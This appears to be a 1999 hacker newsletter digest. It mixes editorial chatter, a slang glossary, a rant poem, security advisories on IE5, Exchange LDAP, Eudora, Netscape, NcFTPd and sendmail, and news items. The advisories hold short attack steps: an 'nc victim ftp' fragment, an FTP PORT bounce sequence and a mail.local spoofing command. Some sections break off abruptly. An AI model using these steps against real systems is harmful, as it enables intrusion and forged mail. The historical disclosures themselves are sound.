   Anyone want to send in comments on the current site or ideas for a new 
   site layout, please do so, i'm no html wizard and all my sites tend to
   end up looking pretty much the same, if you feel creative and want to put
   a demo  site together or point  me in the direction of a site layout you 
   like please do so, i'm getting bored with the haphazard layout of the 
   current site and could use some  creative input on ideas for layout as
   its a bit crowded currently and only looks half decent in 1024x768 
   mode .... tnx

   Synopsis
   --------

   The purpose of this newsletter is to 'digest' current events of interest
   that affect the online underground and netizens in general. This includes
   coverage of general security issues, hacks, exploits, underground news
   and anything else I think is worthy of a look see.

    This list is NOT meant as a replacement for, nor to compete with, the
   likes of publications such as CuD or PHRACK or with news sites such as
   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
   BUGTRAQ or ISN nor could any other 'digest' of this type do so.

    It *is* intended  however, to  compliment such material and provide a
   reference to those who follow the culture by keeping tabs on as many
   sources as possible and providing links to further info, its a labour
   of love and will be continued for as long as I feel like it, i'm not
   motivated by dollars or the illusion of fame, did you ever notice how
   the most famous/infamous hackers are the ones that get caught? there's
   a lot to be said for remaining just outside the circle... <g>

    Canada / North America (hell even if you are inside ..) and wish to
    send printed matter like newspaper clippings a subscription to your
    cool foreign hacking zine or photos, small non-explosive packages
    or sensitive information etc etc well, now you can. (w00t) please
    no more inflatable sheep or plastic dog droppings, or fake vomit
    thanks.

    WANTED!: POSTCARDS! YESH! POSTCARDS, I COLLECT EM so I know a lot of you are
    ~~~~~~~  reading this from some interesting places, make my day and get a
             mention in the zine, send in a postcard, I realize that some places
             it is cost prohibitive but if you have the time and money be a cool
             dude / gal and send a poor guy a postcard preferably one that has some
             scenery from your place of residence for my collection, I collect stamps
             too so you kill two birds with one stone by being cool and mailing in a
             postcard, return address not necessary, just a  "hey guys being cool in
             Bahrain, take it easy" will do ... ;-) thanx.



    Ideas for interesting 'stuff' to send in apart from news:

    - Photo copies of old system manual front pages (optionally signed by you) ;-)
    - Photos of yourself, your mom, sister, dog and or cat in a NON
      compromising position plz I don't want pr0n. <g>
    - Picture postcards
    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
      tapes with hack/security related archives, logs, irc logs etc on em.
    - audio or video cassettes of yourself/others etc of interesting phone
      fun or social engineering examples or transcripts thereof.

    If you still can't think of anything you're probably not that interesting
    a person after all so don't worry about it <BeG>

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    The following comes from Bugtraq's info file:

    This list is for *detailed* discussion of UNIX security holes: what they are,
    how to exploit, and what to do to fix them.

    This list is not intended to be about cracking systems or exploiting their
    vulnerabilities. It is about defining, recognizing, and preventing use of
    security holes and risks.

    Please refrain from posting one-line messages or messages that do not contain
    any substance that can relate to this list`s charter.

    I will allow certain informational posts regarding updates to security tools,
    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
    on this list.

    Please follow the below guidelines on what kind of information should be posted
    to the Bugtraq list:

    + Information on Unix related security holes/backdoors (past and present)
    + Exploit programs, scripts or detailed processes about the above
    + Patches, workarounds, fixes
    + Announcements, advisories or warnings
    + Ideas, future plans or current works dealing with Unix security
    + Information material regarding vendor contacts and procedures
    + Individual experiences in dealing with above vendors or security organizations
    + Incident advisories or informational reporting

    Any non-essential replies should not be directed to the list but to the originator of the message. Please do not "CC" the bugtraq
    reflector address if the response does not meet the above criteria.

       events its a good idea to check out issue #1 at least and possibly also the

      Well what does HWA stand for? never mind if you ever find out I may
     have to get those hax0rs from 'Hackers' or the Pretorians after you.

     In case you couldn't figure it out hax0r is "new skewl" and although
     it is laughed at, shunned, or even pidgeon holed with those 'dumb
     leet (l33t?) dewds' <see article in issue #4> this is the state
     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you
     up  and comers, i'd highly recommend you get that book. Its almost
     like  buying a clue. Anyway..on with the show .. - Editorial staff

  00.5  HWA FAQ v1.0 Feb 13th 1999 (Abridged & slightly updated again)
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Also released in issue #3. (revised) check that issue for the faq
    it won't be reprinted unless changed in a big way with the exception
    of the following excerpt from the FAQ, included to assist first time
    readers:

    Some of the stuff related to personal useage and use in this zine are
    listed below: Some are very useful, others attempt to deny the any possible
    attempts at eschewing obfuscation by obsucuring their actual definitions.

    @HWA   - see EoA  ;-)

    !=     - Mathematical notation "is not equal to" or "does not equal"
             ASC(247)  "wavey equals" sign means "almost equal" to. If written
             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
             to or less than and =>  is equal to or greater than (etc, this aint
             fucking grade school, cripes, don't believe I just typed all that..)

    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)

    AOL    - A great deal of people that got ripped off for net access by a huge
             clueless isp with sekurity that you can drive buses through, we're
             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
             least they could try leasing one??

   *CC     - 1 - Credit Card (as in phraud)
             2 - .cc is COCOS (Keeling) ISLANDS butthey probably accept cc's

    CCC    - Chaos Computer Club (Germany)

   *CON    - Conference, a place hackers crackers and hax0rs among others go to swap
             ideas, get drunk, swap new mad inphoz, get drunk, swap gear, get drunk
             watch videos and seminars, get drunk, listen to speakers, and last but
             not least, get drunk.
   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
                 speak he's the guy that breaks into systems and is often (but by no
                 means always) a "script kiddie" see pheer
              2 . An edible biscuit usually crappy tasting without a nice dip, I like
                  jalapeno pepper dip or chives sour cream and onion, yum - Ed

    Ebonics - speaking like a rastafarian or hip dude of colour <sic> also wigger
              Vanilla Ice is a wigger, The Beastie Boys and rappers speak using
              ebonics, speaking in a dark tongue ... being ereet, see pheer

    FUD    - Coined by Unknown and made famous by HNN <g> - "Fear uncertainty and doubt",
            usually in general media articles not high brow articles such as ours or other
            HNN affiliates ;)

    du0d   - a small furry animal that scurries over keyboards causing people to type
             wierd crap on irc, hence when someone says something stupid or off topic
             'du0d wtf are you talkin about' may be used.

   *HACKER - Read Stephen Levy's HACKERS for the true definition, then see HAX0R

   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
            define, I think it is best defined as pop culture's view on The Hacker ala
            movies such as well erhm "Hackers" and The Net etc... usually used by "real"
            hackers or crackers in a derogatory or slang humorous way, like 'hax0r me
            some coffee?' or can you hax0r some bread on the way to the table please?'

            2 - A tool for cutting sheet metal.

    HHN    - Maybe a bit confusing with HNN but we did spring to life around the same
             time too, HWA Hax0r News.... HHN is a part of HNN .. and HNN as a proper
             noun means the hackernews site proper. k? k. ;&

       when i watch tv all i see are commercials for heartburn stuffs, what is 
       with that? are the subjects of american culture rotting from the inside 
       out? did their bodies realize their sins before their minds did? is this 
       happening with everyone?
       
       
       the world is going downhill fast, and we wont find out until we hit the 
       bottom whether or not our air bags will work. this is a new car 
       commercial, gaudy and loud, "buy or die!" they scream from their tabloid 
       pulpits. our churches have turned into department stores, the very 
       children that are our hope are selling their lives out for a dime bag 
       and a place to stay. we dress in jail rags, chant the rants of the very 
       people that are bringing this psuedo-life to its knees.
       
       
       athletes are yelling the rhymes of corporations at anyone who will 
       listen. our heros are not fighting for equality or freedom, they are 
       throwing hype out about cop killers and hits of coke. you cant eat 
       money, you cant take it with you when you die, and it sure as hell wont 
       stop a bullet. 
       
       
       america is the prostitute of the free and imprisoned world, thousands 
       died so we can enjoy cable from our matching houses with our matching 
       lives. god is for those who are wasting their lives and need another one 
       to spare. we fought for what now? so that rapists and murderers could 
       walk free while political prisoners rotted in their cells?
       
       
       parents work all day so their children can attend public schools that 
       promote insecurity and train the next generation to be faceless and 
       money driven. the smart are encouraged to work for large companies or 
       military services, the down of luck are pushed into low paying jobs and 
       inferior lives. the country will prosper and a revolution will be 
       breathing down our necks.
       
       
       i missed the sermon with the explanation, the end is near and the lord 
       saves. mc donalds will cater the apocalypse, and nike will provide the 
       offical shoe. god sold out to miramax for the film, tarantino has 
       claimed the screenplay, and look out for the soundtrack by backstreet 
       boys. salvation is being sold with an order of fries, healing comes with 
       a free drink, faith by armani.
       
       
       the angels have encountered a glass ceiling, sexual harassment 
       allegations in hell, the government has become "nightly action news". 
       blood and gore, right and wrong, good and bad, pleasure and pain 
       extremes are desired in a moderated world. the second coming will have 
       its own line of clothes, the blood of the lamb is copyrighted. heaven 
       and the inferno have merged and the NASDAQ is reaching all time highs.
       
       
       justice has been fucked over, her sword carried off and her measures 
       used for heroin. the flag is used as a doormat in other countries, our 
       anthem sung by drunk veterans in the middle of the night. this feels 
       like a moment of revelation, but its just another day in Las Vegas. 
       
       
       i wake up in the middle of the night screaming for solace, i cry for a 
       calm sea and a worthy ship. like a panther truth runs through the 
       sleeping city, merging with the gray and spreading over the streets in 
       lies. we are grasping ever bit of cabbie wisdom we can find, slipping 
       over the edge trying to hold on to religion, government, and "family". 
       we have a thirst that encompasses our lives, and it can only be quenched 
       with blood.
       
       
       "i am the alpha and the omega, the begining and the end." i dont 
       remember if it was jesus or bill gates that said that.

 03.0  MSIE 5 is still susceptible to frame spoofing and other bugs

       Subject: IE5 - same vulnerabilities, only some fixed
       
       Hello,
       
       The new Microsoft Internet Explorer 5 (I checked Version: 5.00.0910.1309)
       still allows Frame Spoofing and reading of local Files as described by
       Georgi Guninski (see http://www.whitehats.com/guninski/read.html).
       
       Another new feature named "AutoComplete" stores entries (which also may be
       passwords). Just another new source for passwords which had not been saved
       in IE 4.x.
       
       The Crash-bugs seem to be removed. I could not crash my default installed
       IE 5 using the known exploits.
       
       So far,

 03.1 MSIE 5 problems carried over from earlier versions
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

       There is a Javascript security bug in Internet Explorer 4.x (patched), 
       which circumvents "Cross-frame security" and opens several security holes. 
       
       The problem is: if you add '%01someURL' after an 'about:somecode' URL, IE thinks that the document is 
       loaded from the domain of 'someURL'. Very strange? 
       
       Some of the bugs are: 
       
       1) IE allows reading local files and sending them to an arbitrary server. 
       The filename must be known. 
       The bug may be exploited using HTML mail message. 
       Demo is available (See Demos below)
       
       2) IE allows "window spoofing". 
       After visiting a hostile page (or clicking a hostile link) a window is opened and its 
       location is a trusted site. However, the content of the window is not that of the original site, 
       but it is supplied by the owner of the page. So, the user is misled he is browising 
       a trusted site, while he is browsing a hostile page and may provide sensitive information, 
       such as credit card number. 
       The bug may be exploited using HTML mail message. 
       Demo is available (See below)
       
       3) Reading AUTOEXEC.BAT using TDC. 
       Demo is available: (See below)

       <BODY>
       There is a bug in Internet Explorer 4.x (patched) which allows "window spoofing".
       <BR>
       The problem is: if you add '%01someURL' after the URL, IE thinks that the document is loaded from the domain of 'someURL'.
       <BR>
       This circumvents "Cross-frame security" and opens several security holes.
       <BR>
       <BR>
       After visiting a hostile page (or clicking a hostile link) a window is opened and its location is a trusted site.
       However, the content of the window is not that of the original site, but it is supplied by the owner of the page.
       So, the user is mislead he is browising a trusted site, 
       while he is browsing a hostile page and may provide sensitive information, such as credit card number.
       <BR>
       The bug may be exploited using HTML mail message. The exploit uses Javascript.

 05.0  LDAP buffer overflow

       Subject:  ISS Security Advisory: LDAP Buffer overflow against Microsoft             Directory Services

       ISS Security Advisory
       March 15, 1999
       
       LDAP Buffer overflow against Microsoft Directory Services
       
       Synopsis:
       
       ISS X-Force has discovered a buffer overflow exploit against Microsoft
       Exchange's LDAP (Lightweight Directory Access Protocol) server which
       allows read access to the Exchange server directory by using an LDAP
       client.  This buffer overflow consists of a malformed bind request that
       overflows the buffer and can execute arbitrary code. This attack can also
       cause the Exchange LDAP service to crash. This vulnerability exists in
       Microsoft Exchange Server version 5.5.
       
       Description:
       
       This exploit occurs during the LDAP binding process. Binding involves
       logging in or authenticating to a directory, and consists of sending a
       username, a password, and a binding method. There are two methods in
       which to use this vulnerablility against an Exchange server. The first
       consists of sending a particular type of invalid LDAP bind packet which
       will cause an overflow to occur this will cause the LDAP service to crash.
       The second uses a large malformed LDAP bind packet that is carefully
       crafted to take advantage of the buffer overflow and can be used to
       execute arbitrary code.
       
       Recommendations:
       
       Microsoft has made a patch available for the LDAP attack.  Patch
       information is available at:
       http://www.microsoft.com/security/bulletins/ms99-009.asp
       
       Network administrators can protect internal systems from external attack
       by adding a rule to a filtering router or firewall of the type: Deny all
       incoming TCP packets with a destination port of 389.
       
       Many firewalls or packet filters may already have more restrictive
       rulesets that already encompass this filtering rule, in which case the
       network is already protected from an external attack.  This ruleset would
       include filtering all incoming traffic to TCP port 389.
       
       Additional Information:
       
       These vulnerabilities were primarily researched by the ISS X-Force.

       PATCH FOR "MALFORMED BIND REQUEST" 
       by BHZ, Wednesday 17th Mar 1999 on 8:40 pm CET
       Microsoft has released a patch that eliminates a vulnerability in the LDAP Bind function for Microsoft (r)
       Exchange (r) 5.5. The vulnerability could allow denial of service attacks against an Exchange server or, under
       certain conditions, could allow arbitrary code to be run on the server. A fully supported patch is available, and
       Microsoft recommends that customers who are at risk from this attack download and install it. You can
       obtain patch for X86-based Exchange or Alpha-based Exchange

       I have found another problem with Eudora, attachments, and long filenames that
       is similar to the the problem I found last year.
       
       
       If two messages are sent to an Eudora 4.1 user that have an attachment with a
       filename of around 231 or more, the next time the user checkes his mail Eudora
       crashes.  I say 231 because C:\Program Files\Eudora\Attach\ is 31 characters +
       231 = 262 = longer then Windows can handle.
       
       
       Eudora trucates the long filename correctly and thats why you cant't send just
       one messages with a long name, like you use to be able to do with Eudora 4.0.
       But it truncates it so the the path length is 259 characters which is the
       maximum.  Then when it receives the second attachment it truncates, and trys to
       add a 1 to the end, this is where it crashes.  This allows you to modify the
       return address to point to arbitrary code.
       
       
       Here is how i tested:
       Send message to myself with attchment that has a long filename
       Resend exact message
       Check my mail
       Eudora crashes
       
       
       Both the Win 95 and Win NT versions, along with the 4.2 beta of Eudora are
       affected.
       
       
       The vendor of Eudora, Qualcomm was notified of this problem on 3/12/99.

               Package:  netscape-4.5-9
               Date:     Thu Mar 18 10:22:11 CET 1999
               Affected: unix operating systems using netscape communicator 4.5
       
       
       ______________________________________________________________________________
       
       
       A security whole was discovered in the package mentioned above.
       Please update as soon as possible or disable the service if you are using
       this software on your SuSE Linux installation(s).
       
       
       Other Linux distributions or operating systems might be affected as
       well, please contact your vendor for information about this issue.
       
       
       Please note, that that we provide this information on as "as-is" basis only.
       There is no warranty whatsoever and no liability for any direct, indirect or
       incidental damage arising from this information or the installation of
       the update package.
       
       
       ______________________________________________________________________________
       
       
       1. Problem Description
       
       
           The Netscape Communicator 4.5 comes with "talkback", a quality
           enhancement tool by Fullcircle (www.fullcircle.com).
           If the communicator crashs for any reason, the file with the
           name
       
       
       /tmp/.$UID.talkback
           is read in, and the pid in this file is killed.
           After that, the file is truncated/created without checks for
           {sym|hard}links and the pid of the current talkback process is
           written into the file.
       
       
       2. Impact
       
       
           Anyone on the system can kill a process of users if their communicator
           crashs.
           Anyone on the system can overwrite/create any file an attacked users#
           has write access to.
           We didn't check if there's a buffer overflow possible when the talkback
           application reads in the file.
       
       
       3. Solution
       
       
           Disable talkback. You may do this my executing the following commands
           (your path to netscape may differ):
       
       
               /bin/mv /opt/netscape/talkback /opt/netscape/talkback.disable
       
       
       /bin/chmod -R 600 /opt/netscape/talkback
       
       
           Netscape responded to this vulnerability that the current version
           does not install the talkback application. You may install the new
           version 4.51 from Netscape which also fixes some other security
           vulnerabilities. However, if you update from a 4.5 installation, ensure
           that you execute the lines above.

 09.0  Hotmail to plug potential security problem
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       HOTMAIL BUG
       by BHZ, Sunday 21th Mar 1999 on 3:01 am CET
       The security hole, that Hotmail plans to plug, could make users who access Hotmail
       through a public terminal or other shared computer vulnerable to the prying eyes of
       subsequent users. Hotmail said it had caught the security problem during a routine
       security audit and was close to implementing its fix, which is to stop authentication
       by IP address and require the use of cookies. The service noted that users currently
       can protect themselves against the exploit by opting for cookie-based authentication.

       Affected Program        NcFTPd <http://www.ncftp.com>
       Description             FTP server (commercial)
       Severity                Theoretical root compromise, logs compromise
       
       
       Synopsis:
       
       NcFTPd is a commercial FTP (File Transfer Protocol) server, in the
       NcFTP product line.  The source code is not publicly released.  This
       was tested on Linux with libc5 (there's a glibc2 specific version
       available).
       
       Problem:
       
       NcFTPd's PORT parsing function has a stack buffer overflow
       problem, which would basically allow a user to remotely execute
       arbitrary code - the thing here is that the PORT parsing function
       seem to change characters, that are not in the range 0x30-0x39
       (ASCII '0'-'9'), into 0x20 (ASCII space), hence making an exploit
       almost impossible (note that, if ascii 0x40 would be allowed that
       would be a different story =p).
       
       The program only parses for characters out of the 0-9 range in a
       specific area in memory (the one that contains return address heh)
       - the rest is kept unchanged, and you can't really go further in
       memory, input line size is restricted.
       
       Like with most buffer overflows there are probably work-arounds to
       exploit it - this could have been a particulary neat exploit, since
       it runs as a child and one could gain access transparently without
       crashing the parent.
       
       The current bug is not really a problem, it can crash the child process
       with a segfault, the parent process receives a signal 6 (abort) and the
       child process stay zombie for a few seconds and a brand new one is created.
       A few minor DoS attacks are possible but, who cares.  Oh and this could be
       used to not get listed in the logs too.
       
       Example:
       
       --
       evil:$ nc victim ftp

 10.1  NcFTPd proxy exploitation

       Affected Program        NcFTPd <http://www.ncftp.com>
       Description             FTP server (commercial)
       Severity                Default PORT setup, log compromise
       
       
       Synopsis:
       
       NcFTPd is a commercial FTP (File Transfer Protocol) server, in the
       NcFTP product line.  The source code is not publicly released.  This
       was tested on Linux with libc5 (there's a glibc2 specific version
       available).
       
       Overview:
       
       To initiate a FTP transfer, there must be two connections, one
       control connection (server's ftp port), and one data connection.
       When a client wants to tell the server where to send the data (ie.
       a file you want to download, or a directory listing), it must use
       the command PORT - in which the destination address and port is
       specified.
       
       Problem:
       
       NcFTPd does not check that the destination PORT address is the
       user's IP.  This means anybody can transmit data from the server
       anywhere, anonymously.  Obviously this can lead to potential
       `easy' DoS attacks and spoofing (say, someone uploads a file
       containing commands of something to incoming, PORT to some host/port,
       and use RETR (retrieve file)).  Such connections are possible
       with the default NcFTPd configuration, but can be disallowed:
       general.cf> allow-outgoing-proxy-data-connection-ports-below-1024 - no
       general.cf> allow-proxy-connections - no
       
       Most other FTP server daemons I've tried has this feature
       disabled - even if the proxy connections are a documented part of
       RFC 959 (FTP protocol).  But this is no big deal, just a possible
       amelioration.
       
       I made an example program that listens on a port and dumps
       arbitrary received data in string, hex or ascii/hex format,
       and sends back EOF (needed for FTP data transfer).
        [http://poc.csoft.net/code/listerine/listerine.tar.gz]
       
       Example:
       
       evil:$ telnet victim ftp                # victim runs NcFTPd
       user anonymous                          # anonymous is up by default
       pass some@thing
       port 192,168,0,1,5,131                  # connect on port 1411
       retr incoming/stuff                     # send arbitrary data, as it
                                               # was coming from host victim.
       
       To see for yourself, you can run my example program `listerine', on
       the host victim.  I tested this on my LAN and on remote machines too.
       
       
       Status:
       
       Got response from authors, the problem can be fixed indeed with
       the general.cf options mentionned above, but are not enabled with
       default configuration.

       used as a local mailer (forwards mail to mailboxes), also able to
       handle LMTP commands.  It runs SUID root in order to access the
       users's mailbox (ie. /var/spool/mail, /usr/spool/mail).
       
       Overview:
       
       When mail has to be written to a user's mailbox locally, a local
       mailer is used; the mail.local program that comes with Sendmail
       does this task, but does not restrict the length of a message, or
       does not check the authenticity of the user who sends it.
       
       This is obviously not a big security issue - but still, it has to
       get fixed, as this could lead to more serious problem if used
       on a system with lots of e-mail accounts.
       
       Problem:
       
       This can lead to the compromising of anybody's mailbox - from fake
       (and totally untraceable messages), to flooding the mailbox (and
       maybe the hard drive).  I found this by inspecting the source code for
       buffer overflows heh.
       
       Say I wanted to send a fake message like it was coming from root
       to user joe, simply running
          mail.local -f root joe
          <message+eof>
       could do it.  mail.local simply dumps the message as you enter
       it in the user's maibox.
       
       Since mail.local does not checks for message length, you can
       flood a mailbox (and possibly the hard drive) in a matter of seconds.
       
       Finally, mail.local only check if a user exists by using /etc/passwd,
       that means anybody could create mailboxes for users like bin, nobody,
       etc (usually it's no security compromise).

       Hackers Sack Competition Site
       by Leander Kahney 

       5:00 p.m.  23.Mar.99.PST
       Having baited crackers with a "hacking" competition to win a 
       backpack, a retailer's site has been hacked for real. <sic>

       As previously reported, a Belgian bag manufacturer is giving a
       "Hacker" branded backpack to everyone that cracks a password 
       competition on its Web site. 

       But on Tuesday Kipling's site was hacked for real. 

       The opening page was replaced with a screen grab that showed a
       big red cross  and the message: "Sorry, we've been hacked.... 
       Site under reconstruction." 

       The altered page stayed up for most of Tuesday, and Kipling was
       unavailable for comment. <sic>

       The site intrusion may have been retaliation for disparaging remarks 
       made about crackers by a Kipling vice president. 

       Shortly before the site was hacked, the password competition was 
       finally cracked. It took a week of trying, claimed Mooby,
       a hacker who organized a brute force method of using software to 
       generate all possible combinations. 

       The crackers' efforts finally paid off over the weekend, Mooby said 
       in an email. 

       Ironically, the password wasn't cracked by software, but obtained by
       a more traditional method -- weaseling it out of someone. 

       "It's a pity that I can't tell how I got the final password/login," 
       he wrote. "We never would have guessed [it]. Let's just say I used 
       some of my nerd-heroic social skills to get the right things." 

       Having obtained the password, Mooby shared it. 

       "I hope Kipling sends me this backpack," he wrote, "and all the 
       other 99 people I told the password."

       Retailer Frustrates Hackers
       by Leander Kahney 
       3:00 a.m.  20.Mar.99.PST
       
       
       Promoting a new line of backpacks aimed at "hackers," a European bag
       manufacturer is running a crack-the-password competition on its Web site. 
       
       
       But to the fury of hackers trying to bypass the competition and crack the
       site in earnest, all attempts to date have been unsuccessful. 
       
       
       According to an amusing line of posts to Slashdot, an information
       clearinghouse for computer nerds, the hackers reveal their mounting
       frustration at being unable to thwart the password competition. 
       
       
       "Come on!" wrote one. "Out of the 10,000 people who have read this
       article, no one has found the username and password? I find that very hard
       to believe. It has to be something completely insanely easy, right?" 
       
       
       Apparently not. 
       
       
       The "crack and win" password competition is organized by Kipling, a
       manufacturer of travel bags, backpacks, and accessories based in Antwerp,
       Belgium. The competition promotes its Hacker line of bags and backpacks,
       which have names like bookmark, mailbomb, browser, spam, firewall, and
       download. 
       
       
       "The game challenges every pirate out there to break into our security and
       win a Hacker bag," the company said in a press release. 
       
       
       "You can find the code in two ways," the release continued. "Real computer
       freaks will find the information in the traditional hacker manner. Those
       with less hacking experience can follow the hints which appear on the
       screen, which refer surfers to a Kipling sales point. Those who remain
       alert will surely find the letter/number code." 
       
       
       Kipling confirmed it would give a bag to everyone who cracks the code,
       which takes the form of a username login and password. 
       
       
       Rising to the challenge, readers of Slashdot quickly encouraged each other
       to break the code, just for the hell of it. But after a week of trying,
       most efforts have been abandoned. 
       
       
       "I'm sorry to say that so far no one has been able to beat the login,"
       said Slashdot contributor Greg Boyce, who offered to buy a Slashdot hat
       for the first person to crack it. "Turns out it was a bit more complicated
       than I thought it would be." 
       
       
       The most ambitious attempt adopted a "brute force" strategy generating all
       possible combinations of username and password. Special software to
       automate the process is available on the Web. 
       
       
       Other attempts ranged from examining the source code for the Web page,
       which is coded in Javascript, to breaking into the site. 
       
       
       However, Kipling said attempts to breach the site's security have so far
       failed. 
       
       
       "No one has cracked it," said Edith Iris, Kipling's marketing manager.
       "We've had no problems." 
       
       
       To add to the hackers' irritation, Kipling also garbled the definitions of
       cherished computer terms in its marketing blurb. 
       
       
       According to Kipling's site, "A hacker is a cunning computer expert who
       cracks the security systems of computers in order to steal or destroy
       information." 
       
       
       But in the programming community, a malicious computer expert is called a
       "cracker." A hacker is simply a harmless programmer. 
       
       
       "Hacker is the term in common parlance," countered Larry Lein, executive
       vice president of Kipling USA. "If you asked me what a cracker was, I'd
       say someone who lived in a trailer park down South."

       Sound the alarm!
       IETF working group seeks to improve security alerting.
       By Sandra Gittlen
       Network World Fusion, 03/16/99
       
       
       MINNEAPOLIS - An IETF working group has stepped up work on a protocol for
       broadcasting alerts of network breaches across proprietary security
       applications. 
       
       
       The Intrusion Detection Message Exchange Protocol (IDMEP) would let
       applications - and system managers - quickly share information about
       attacks, according to IDMEP working group members.  They are meeting here
       as part of an overall IETF conference. 
       
       
       "[IDMEP] will be useful for attacks launched from one domain to another," 
       says working group attendee Brian Tung, a computer scientist at the
       University of Southern California's Information Sciences Institute. "If a
       source domain notices an attack, it can notify the destination network. 
       Right now, that's done by a human." 
       
       
       The group had met last year at the IETF meeting in Orlando, but was
       unsuccessful in gaining consensus and had to revamp its plans. This time,
       meeting attendees seemed encouraged by the group's efforts. 
       
       
       With the protocol, which could be based on SNMP Version 3, an alert
       detailing the type of attack in progress will be automatically sent across
       the network, along with a reference, such as a URL or a system file, where
       the network manager can find further information.  That information could
       be the threshold setting of the alerter's system letting the recipient
       know what the alerter considers an attack or what the alerter suggests as
       a response for such an attack. 
       
       
       Mark Wood, product line manager at Internet Security Systems in Atlanta,
       says IDMEP could dramatically improve responses to attacks because
       networks will be sharing information, not duplicating efforts. 
       
       
       In fact, Tung says that hooking the IDMEP to policy networks could let
       users set up automatic responses to alerts and, therefore, ward them off. 
       
       
       "There are a number of dollars to be had in [the intrusion detection
       tools] market," says Stuart Staniford-Chen, co-chair of the working group.
       In fact, the projected market for intrusion detection tools is expected to
       be $200 million, according to analysts at the Aberdeen Group, a Boston
       consultancy. "Therefore, we need to get moving on this [protocol]." 
       
       
       Wood says he expects the protocol to be completed by the middle of next
       year, but products based on a proposed standard could be released as early
       as the first quarter of next year. Cisco and Axent are also working on the
       protocol.

 14.0  Report: Military computers vulnerable
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 


       
       http://www.usatoday.com/life/cyber/tech/cte684.htm
       
       
       Report: Military computers vulnerable
       WASHINGTON (AP) - The military's key communications 
       infrastructure linking combat, intelligence and command 
       forces is dangerously vulnerable to attacks from cyberspace 
       and requires urgent changes in Defense Department policy, 
       said a study released Monday. 
       
       
       The Command, Control, Communications, Computers and 
       Intelligence systems, known as C4I, is compromised by 
       security problems and also by a military culture prone to 
       treating such problems as a lesser priority, the National 
       Research Council reported.
       
       
       ''The rate at which information systems are being relied on 
       outstrips the rate at which they are being protected,'' it 
       said. ''The time needed to develop and deploy effective 
       defenses in cyberspace is much longer than the time 
       required to develop and mount an attack.'' 
       
       
       Despite evidence of security lapses in C4I -- which handles 
       communications and warning tasks all along the chain of 
       command -- the Pentagon's ''words regarding the importance 
       of information systems security have not been matched by 
       comparable action,'' the report said. 
       
       
       ''Troops in the field did not appear to take the protection 
       of their C4I systems nearly as seriously as they do other 
       aspects of defense,'' said the report, which Congress 
       ordered the Pentagon to commission in 1995. The council is 
       an independent organization chartered by Congress to advise 
       the government. 
       
       
       The report indicated the problems were due more to the 
       Pentagon's management of the systems than to the technology 
       itself. It cited C4I workers' lack of stature compared with 
       traditional combat forces, compatibility problems between 
       the services and a need for more budget flexibility on the 
       matter from both the Defense Department and Congress. 
       
       
       In a statement, the Pentagon acknowledged that the U.S. 
       military's strength ''is our information technology,'' and 
       that ''our dependence on such assets, which may be subject 
       to malicious attack, makes information technology our 
       weakness as well.'' 
       
       
       It said that as the council's report was being prepared, 
       the Defense Department had already improved protection 
       against computer attack by implementing new programs, 
       establishing a joint task force for computer defense and 
       expanding training of its information technology personnel. 
       
       
       But Kenneth Allard, an analyst who has written about C4I, 
       said its weaknesses are in part the fault of ''Industrial 
       Age'' military acquisition policies -- applying to 
       computers as well as tanks, ships and aircraft -- that give 
       the services their own procurement duties. 
       
       
       Ships and tanks may perform different tasks, he said, but 
       the Army, Navy and other services need a single-standard 
       computer system. 
       
       
       ''Twenty-first century combat is the war of the databases, 
       in which information flows must go from the foxhole to the 
       White House and back down again,'' said Allard, a former 
       Army colonel and analyst at the Center for Strategic and 
       International Studies who had not yet read the council's 
       report. 
       
       
       The report recommended: 
       
       
       Making C4I a greater budget priority in defense spending, 
       with a flexibility that can ''exploit unanticipated 
       advances in C4I technology.'' 
       Designating an organization responsible for providing 
       direct defensive operational support to commanders. 
       Funding a program to conduct frequent, unannounced 
       penetration testing of C4I systems. 
       Ensuring that programs are operable even if one part has 
       been penetrated by an adversary. 
       Emphasizing the importance of information technology in the 
       military leadership. 
       Establishing an Institute for Military Information 
       Technology, possibly as part of an existing body.

 15.0  International raid cracks child porn ring

       International raid cracks child porn ring 
 
       March 19, 1999
       Web posted at: 5:35 p.m. EST (2235
       GMT)
 
       MUNICH (Reuters) -- German
       police said on Friday they had
       cracked an international Internet
       child pornography ring after
       launching a coordinated sweep
       through seven countries. 
 
       In a raid of private homes coordinated from Munich, German police said
       they had confiscated thousands of outlawed photographs and video images
       which had been traded and distributed via Internet "chat rooms." 
 
       German police said the action, codenamed "Bavaria," had taken place on
       Wednesday and involved simultaneous raids of suspects' homes in Germany,
       Switzerland, Sweden, Britain, Norway, the United States and Canada. 
 
       Holger Kind, an official from the Federal Crime Office, said the material
       uncovered had been the widest sweep of its kind led from Germany. 
 
       "You can assume this will not be the last raid of its kind," Kind told a news
       conference. 
 
       Kind said some suspects had already confessed to involvement in the ring. If
       convicted in Germany, the suspects could face a prison sentence of up to
       five years in jail. Switzerland and Britain have arrested one suspect each. 
 
       Police in Sweden and the United States also found banned material in the
       raids featuring children between the ages of three and four, police in Bavaria
       said.

       From the ACPM site;
       
         We pray for children who are sick. children who
         may not live to see their next birthday.... or
         tomorrow, children who go into hospitals, never to
         come out children who don't deserve to die. We
         pray for the children that don't understand why......
         why they're not like other children who are healthy
         children who play in the sunlight dance on the
         grass, children who enjoy life children that don't
         think about death.
         We pray for children who stare at photographers
         from behind barbed wire, who can't run down the
         street in a new pair of sneakers, who are born in
         places we wouldn't be caught dead in, who live in
         an X-rated world.
         We pray for those children who never get dessert,
         who have no security blanket to drag behind them,
         children who watch their parents watch them die.
         children who can't find any bread to steal, children
         who don't have any rooms to clean up, whose
         pictures aren't on anybody's dresser, whose
         monsters are real.
